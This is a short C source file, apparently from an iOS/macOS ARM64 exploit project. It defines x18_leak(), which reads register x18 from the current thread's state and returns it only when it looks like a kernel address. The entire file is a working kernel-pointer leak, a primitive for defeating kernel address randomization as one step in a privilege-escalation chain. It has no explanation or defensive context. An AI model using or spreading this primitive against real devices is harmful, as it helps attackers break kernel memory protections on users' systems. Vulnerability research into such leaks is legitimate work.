#include "x18_leak.h"

#include <mach/mach.h>

uint64_t
x18_leak() {
	mach_port_t thread = mach_thread_self();
	arm_thread_state64_t state;
	mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
	kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t) &state, &count);
	mach_port_deallocate(mach_task_self(), thread);
	if (kr != KERN_SUCCESS) {
		return 0;
	}
	if ((state.__x[18] & 0xfffffff000000000) != 0xfffffff000000000) {
		return 0;
	}
	return state.__x[18];
}
